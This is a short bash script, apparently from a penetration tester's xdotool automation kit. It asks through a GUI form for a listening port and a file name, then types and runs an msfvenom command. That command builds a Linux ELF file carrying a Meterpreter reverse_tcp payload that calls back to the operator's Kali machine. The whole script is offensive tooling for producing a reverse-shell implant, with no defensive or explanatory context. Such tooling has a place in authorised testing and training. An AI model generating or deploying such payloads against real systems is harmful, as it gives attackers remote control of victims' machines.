#!/bin/bash

: '
Create ELF file
'

source ~/Desktop/base/code/xdotool/helpers/paste_commands.sh
source ~/Desktop/base/code/xdotool/helpers/get_kali_ip.sh
source ~/Desktop/base/code/xdotool/helpers/generate_gui_form.sh

# Generate gui form
generate_form "LPORT" "filename"

LPORT=${form_data["LPORT"]}
FILE=${form_data["filename"]}

paste_command "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=${KALI_IP} LPORT=${LPORT} -f elf -o ${FILE}.elf"
xdotool key Return
